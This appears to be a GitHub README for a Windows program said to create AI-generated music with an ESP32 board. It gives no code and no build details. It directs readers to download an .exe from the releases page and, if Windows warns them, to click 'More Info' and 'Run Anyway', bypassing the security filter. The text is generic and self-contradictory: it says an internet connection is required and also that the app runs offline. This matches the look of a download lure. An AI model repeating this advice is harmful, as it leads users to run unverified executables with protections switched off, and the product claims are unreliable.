# 🎵 ai-music-esp32 - Create music using simple hardware gadgets

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Aroon9806/ai-music-esp32/releases)

This project connects small ESP32 computers to smart music tools. You can create generative music sequences with simple hardware. The system uses machine learning models to help you play and compose. It works on your local hardware to keep your music private.

## 🛠 What you need

Before you start, make sure you have these items.

* A Windows computer with Windows 10 or 11.
* An ESP32 development board.
* A standard USB cable for your board.
* An active internet connection.

This software runs on your computer and sends commands to the ESP32 board. You do not need to write code. You only need to plug in the hardware and run the software package.

## 📥 How to get the app

Follow these steps to install the system.

1. Visit this page to download: [https://github.com/Aroon9806/ai-music-esp32/releases](https://github.com/Aroon9806/ai-music-esp32/releases).
2. Look for the file ending in .exe under the latest version.
3. Click the name of the file to save it to your computer.
4. Locate the file in your Downloads folder.
5. Double-click the file to start the installation.

If Windows shows a security prompt, click "More Info" and then "Run Anyway." This happens because the app is brand new and not yet known to the Windows security filter.

## 🔌 Connecting your hardware

After you finish the installation, connect your ESP32 board to your computer using the USB cable.

1. Plug the USB cable into your ESP32 board.
2. Plug the other end into a USB port on your Windows computer.
3. Wait for the computer to recognize the device. This takes about 10 seconds.
4. Open the ai-music-esp32 program from your Start menu.

The application detects the board automatically. Once the connection works, you will see a green light indicator in the top right corner of the app window.

## 🎹 Making music

The main window shows a control panel. You can change the music style using the drop-down menu. 

- Select a genre from the list.
- Click the "Start" button to begin the generative process. 
- Use the sliders to change the speed and intensity of the music.

The software sends signals to the ESP32 board. You can connect speakers or buzzers to the pins on your board to hear the output. The system generates fresh melodies as long as it stays on. Click "Stop" to end the session.

## ⚙️ Settings and adjustments

You can adjust how the app interacts with your hardware. Click the "Settings" gear icon to open the configuration menu.

- **Port Select:** Choose the COM port that matches your ESP32 board if the app does not find it by itself.
- **Buffer Size:** Change this if you hear stuttering in the audio output. Higher numbers often fix gaps.
- **Model Path:** The app automatically finds the music model. Leave this setting alone unless you have a custom music file to load.

Changes take effect as soon as you close the settings window.

## ❓ Frequently asked questions

**Does this run offline?**
Yes. You do not need an internet connection to generate music after you download the app.

**Why does the app look basic?**
The focus remains on performance and stability. A simple interface keeps your computer memory free for music processing.

**Can I use multiple boards at once?**
Yes. You can open multiple instances of the app. Every instance detects a separate ESP32 board.

**Can I save the music I create?**
Yes. Click the "Record" button inside the app. It saves your output to a WAV file in your Documents folder.

## 🔧 Troubleshooting issues

If you encounter problems, check these areas first.

* **The board does not show up.** Some USB cables carry data only for charging. Try a cable known to transfer data.
* **The app crashes on launch.** Make sure your computer has the latest Windows updates. Restart the computer to clear system errors.
* **No sound comes out.** Move the audio wire to a different pin on your ESP32 board. Consult the pinout diagram for your specific board model.
* **The music sounds blurry.** Set your buffer size to 512 or higher in the settings menu.

## 📋 Features

This project includes advanced tools for users of all skill levels.

- **Real-time generation:** The music reacts to your inputs immediately.
- **Local processing:** Everything runs on your hardware. No cloud accounts are necessary.
- **Low latency:** The system handles data transfer between your computer and the ESP32 board with high speed.
- **Hardware agnostic:** The app works with standard ESP32 boards available in most electronics stores.
- **MIDI support:** You can route the output to a virtual MIDI cable to use with other music software.

## 📝 Usage guidelines

Use this software for creative purposes only. The app includes basic security controls to prevent incorrect data from reaching your hardware. Always disconnect your board if you notice any unusual heat or smell from the device. The developers built this tool to provide a bridge between machine learning and simple physical projects. Experiment with different settings to see how the AI responds to your choices.